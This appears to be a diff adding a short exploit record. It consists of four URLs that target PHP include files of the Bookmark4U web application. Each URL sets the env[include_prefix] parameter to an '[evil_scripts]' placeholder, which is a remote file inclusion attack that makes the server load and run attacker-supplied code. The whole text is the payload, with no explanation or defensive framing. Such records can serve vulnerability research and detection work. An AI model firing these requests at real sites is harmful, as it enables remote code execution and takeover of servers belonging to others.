@@ -1,0 +1,4 @@
+http://www.example.com/[Bookmark4Upath]/inc/dbase.php?env[include_prefix]=[evil_scripts]
+http://www.example.com/[Bookmark4Upath]/inc/config.php?env[include_prefix]=[evil_scripts]
+http://www.example.com/[Bookmark4Upath]/inc/common.php?env[include_prefix]=[evil_scripts]
+http://www.example.com/[Bookmark4Upath]/inc/function.php?env[include_prefix]=[evil_scripts]
